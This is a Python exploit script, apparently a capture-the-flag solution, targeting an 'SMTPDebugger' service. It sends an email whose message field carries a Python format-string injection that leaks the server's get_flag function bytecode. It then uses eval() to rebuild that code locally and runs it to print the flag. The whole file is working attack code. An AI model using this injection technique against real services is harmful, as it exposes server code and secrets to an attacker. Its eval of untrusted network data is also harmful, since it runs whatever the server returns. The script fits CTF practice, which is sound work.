import re
import json
import socket
from types import CodeType
from argparse import ArgumentParser
from SMTPDebugger import SMTPDebugger


def exploit(host="localhost", port=3780):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        data = s.recv(4096)

        s.sendall(json.dumps({
            "from_addr": "from@addr.com",
            "to_addrs": "to@addr.com",
            "subject": "subject",
            "message": "co_argcount={email.get_flag.__code__.co_argcount};"
                       "co_cellvars={email.get_flag.__code__.co_cellvars};"
                       "co_code={email.get_flag.__code__.co_code};"
                       "co_consts={email.get_flag.__code__.co_consts};"
                       "co_filename='{email.get_flag.__code__.co_filename}';"
                       "co_firstlineno={email.get_flag.__code__.co_firstlineno};"
                       "co_flags={email.get_flag.__code__.co_flags};"
                       "co_freevars={email.get_flag.__code__.co_freevars};"
                       "co_kwonlyargcount={email.get_flag.__code__.co_kwonlyargcount};"
                       "co_lnotab={email.get_flag.__code__.co_lnotab};"
                       "co_name='{email.get_flag.__code__.co_name}';"
                       "co_names={email.get_flag.__code__.co_names};"
                       "co_nlocals={email.get_flag.__code__.co_nlocals};"
                       "co_stacksize={email.get_flag.__code__.co_stacksize};"
                       "co_varnames={email.get_flag.__code__.co_varnames};"
        }).encode('utf-8') + b"\n")

        data += s.recv(4096)
        res = re.search("co_argcount=(?P<co_argcount>.*);"
                        "co_cellvars=(?P<co_cellvars>.*);"
                        "co_code=(?P<co_code>.*);"
                        "co_consts=(?P<co_consts>.*);"
                        "co_filename=(?P<co_filename>'.*');"
                        "co_firstlineno=(?P<co_firstlineno>.*);"
                        "co_flags=(?P<co_flags>.*);"
                        "co_freevars=(?P<co_freevars>.*);"
                        "co_kwonlyargcount=(?P<co_kwonlyargcount>.*);"
                        "co_lnotab=(?P<co_lnotab>.*);"
                        "co_name=(?P<co_name>'.*');"
                        "co_names=(?P<co_names>.*);"
                        "co_nlocals=(?P<co_nlocals>.*);"
                        "co_stacksize=(?P<co_stacksize>.*);"
                        "co_varnames=(?P<co_varnames>.*);", data.decode('unicode_escape'))

        co_args = res.groupdict()
        for co_arg in co_args:
            co_args[co_arg] = eval(co_args[co_arg])

        code = CodeType(
            co_args['co_argcount'],
            co_args['co_kwonlyargcount'],
            co_args['co_nlocals'],
            co_args['co_stacksize'],
            co_args['co_flags'],
            co_args['co_code'],
            co_args['co_consts'],
            co_args['co_names'],
            co_args['co_varnames'],
            co_args['co_filename'],
            co_args['co_name'],
            co_args['co_firstlineno'],
            co_args['co_lnotab'],
            co_args['co_freevars'],
            co_args['co_cellvars'],
        )
        SMTPDebugger.get_flag.__code__ = code
        print(SMTPDebugger.get_flag())


if __name__ == "__main__":
    parser = ArgumentParser()

    # Proxy Configuration
    parser.add_argument("-s", "--host",
                        help="application host",
                        default="localhost")
    parser.add_argument("-p", "--port",
                        help="application port",
                        type=int,
                        default=3780)
    sys_args = vars(parser.parse_args())

    exploit(**sys_args)
